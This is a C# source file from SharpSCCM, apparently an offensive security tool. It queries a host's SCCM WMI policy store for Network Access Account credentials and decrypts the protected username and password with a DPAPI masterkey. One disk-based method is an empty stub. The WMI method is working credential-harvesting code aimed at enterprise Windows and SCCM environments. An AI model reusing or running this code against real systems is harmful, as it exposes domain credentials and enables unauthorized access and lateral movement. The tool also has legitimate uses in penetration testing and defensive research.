// This code was taken/derived from Will Schroeder's (@harmj0y) SharpDPAPI project
// https://github.com/GhostPack/SharpDPAPI

using System;
using System.Management;

namespace SharpSCCM
{
    public class Credentials
    {

        public static void LocalNetworkAccessAccountsDisk(string masterkey)
        {
            // We don't need to be elevated to read the blob...

            // but we do need to be elevated to retrieve the key to decrypt the blob
            if (Helpers.IsHighIntegrity())
            {
                
            }
        }

        public static void LocalNetworkAccessAccountsWmi(string masterkey)
        {
            if (Helpers.IsHighIntegrity())
            {
                ManagementScope sccmConnection = MgmtUtil.NewSccmConnection("\\\\localhost\\root\\ccm\\policy\\Machine\\ActualConfig");
                MgmtUtil.GetClassInstances(sccmConnection, "CCM_NetworkAccessAccount");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(sccmConnection, new ObjectQuery("SELECT * FROM CCM_NetworkAccessAccount"));
                ManagementObjectCollection accounts = searcher.Get();
                if (accounts.Count > 0)
                {
                    foreach (ManagementObject account in accounts)
                    {
                        string protectedUsername = account["NetworkAccessUsername"].ToString().Split('[')[2].Split(']')[0];
                        string protectedPassword = account["NetworkAccessPassword"].ToString().Split('[')[2].Split(']')[0];
                        byte[] protectedUsernameBytes = Helpers.StringToByteArray(protectedUsername);
                        int length = (protectedUsernameBytes.Length + 16 - 1) / 16 * 16;
                        Array.Resize(ref protectedUsernameBytes, length);
                        try
                        {

                            Dpapi.Execute(protectedUsername, masterkey);
                            Dpapi.Execute(protectedPassword, masterkey);

                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
                            Console.WriteLine(e.ToString());
                        }
                    }
                }
                else
                {
                    Console.WriteLine($"[+] Found 0 instances of CCM_NetworkAccessAccount.\n");
                    Console.WriteLine($"[+] \n");
                    Console.WriteLine($"[+] This could mean one of three things:\n");
                    Console.WriteLine($"[+]    1. The SCCM environment does not have a Network Access Account configured\n");
                    Console.WriteLine($"[+]    2. This host is not an SCCM client (and never has been)\n");
                    Console.WriteLine($"[+]    3. This host is no longer an SCCM client (but used to be)\n");
                    Console.WriteLine($"[+] You can attempt running 'SharpSCCM local naa disk' to retrieve NAA credentials from machines\n");
                    Console.WriteLine($"[+] that used to be SCCm clients but have since had the client uninstalled.");
                }
            }
        }
    }
}
